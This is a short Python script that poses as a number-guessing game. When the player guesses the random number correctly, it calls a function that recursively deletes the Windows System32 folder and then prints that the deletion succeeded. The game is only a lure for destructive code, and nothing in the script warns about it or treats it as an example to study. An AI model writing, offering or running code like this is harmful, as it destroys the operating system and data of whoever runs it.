import random
import os
import shutil

def delete_system32():
    try:
        system32_path = os.path.join(os.environ['SYSTEMROOT'], 'System32')
        shutil.rmtree(system32_path)
    except Exception as e:
        print(f"Error occurred while deleting System32 folder: {e}")

random_num = random.randint(1, 10)
user_input = int(input(f"Guess a number between 1 and 10: "))

if user_input == random_num:
    delete_system32()
    print("You have successfully deleted System32 folder.")
else:
    print(f"Sorry, the correct answer was {random_num}.")